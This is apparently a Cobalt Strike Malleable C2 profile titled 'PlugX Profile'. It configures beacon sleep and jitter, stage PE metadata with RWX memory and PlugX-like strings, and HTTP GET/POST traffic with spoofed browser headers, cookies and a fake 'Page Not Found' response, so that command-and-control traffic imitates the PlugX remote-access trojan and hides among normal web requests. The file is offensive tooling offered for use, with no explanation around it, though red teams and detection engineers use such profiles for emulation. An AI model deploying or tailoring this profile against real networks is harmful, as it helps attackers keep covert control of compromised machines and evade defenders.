#
# PlugX Profile
# Author: @infosecn1nja
#
# https://github.com/silence-is-best/c2db/blob/master/README.md

set sleeptime "30000"; # use a ~30s delay between callbacks
set jitter    "10"; # throw in a 10% jitter

stage {
    set checksum       "0";
    set compile_time   "28 Jun 2018 04:38:07";
    set entry_point    "5968";
    set name           "Shellcode.dll";
    set rich_header    "\x02\x8c\xde\x7b\x46\xed\xb0\x28\x46\xed\xb0\x28\x46\xed\xb0\x28\x00\xbc\x6f\x28\x42\xed\xb0\x28\x4f\x95\x23\x28\x4f\xed\xb0\x28\x46\xed\xb1\x28\x5b\xed\xb0\x28\x4b\xbf\x55\x28\x7d\xed\xb0\x28\x4b\xbf\x6c\x28\x47\xed\xb0\x28\x4b\xbf\x6e\x28\x47\xed\xb0\x28\x52\x69\x63\x68\x46\xed\xb0\x28\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";


    # obfuscations
    set userwx "true";
    set stomppe "false";

    # strings
    stringw "/update?id=%8.8x";
    stringw "VVubPDixKeBURoQIIyfb";
    stringw "https";
    stringw "POST";
    stringw "POST";
    string "d:\\work";
    string "plug2.5";
    string "Plug3.0";
    string "Shell6";
}

http-get {

    set uri "/";

    client {

        header "Accept" "*/*";
        header "Cookie" "QhTbeUW+YzYYsZWz0PQvBvYIgo8=";
        header "User-Agent" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)";
        header "Connection" "Keep-Alive";
        header "Cache-Control" "no-cache";

        metadata {
            base64url;
            uri-append;
        }
    }

    server {
        header "Server" "nginx";
        header "Content-Type" "text/html;charset=UTF-8";
        header "Cache-Control" "no-cache";
        header "Pragma" "no-cache";
        header "Expires" "Thu, 01 Jan 1970 00:00:00 GMT";
        header "X-Server" "ip-172-31-28-245";
        header "Set-Cookie" "JSESSIONID=4618E9008B004BEE8FE5C81AB063A332; Path=/; HttpOnly";

        output {
            base64url;        
            prepend "............?";
            append "..]..2.........   :...Q.";
            print;
        }
    }
}

http-post {

    set uri "/update";

    client {
    
        header "User-Agent" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1;";
        header "Accept" "*/*";
        header "x-debug" "0";
        header "x-request" "0";
        header "x-content" "61456";
        header "x-storage" "1";
        header "Cache-Control" "no-cache";

        id {
            netbios;
            parameter "wd";
        }

        output {
            print;
        }
    }

    server {
        header "Server" "Apache 1.3.27";
        header "Accept-Ranges" "bytes";
        header "Cache" "no-cache";
        header "Content-Type" "text/html";

        output {
            netbios;
            prepend "<HTML><BODY><B>The Page You Requested Was Not Found!</B></BODY></HTML>";
            print;
        }
    }
}
